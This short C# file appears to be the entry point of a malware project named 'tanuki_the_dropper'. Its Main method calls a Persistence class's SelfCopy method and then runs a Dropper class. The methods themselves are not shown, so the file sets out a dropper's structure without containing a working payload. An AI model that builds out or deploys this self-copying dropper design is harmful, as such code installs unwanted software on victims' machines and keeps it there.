namespace tanuki_the_dropper
{
    class Program
    {

        static void Main(string[] args)
        {
            Persistence persistence = new Persistence();
            persistence.SelfCopy();

            Dropper dropper = new Dropper();
            dropper.Run();
        }
    }
}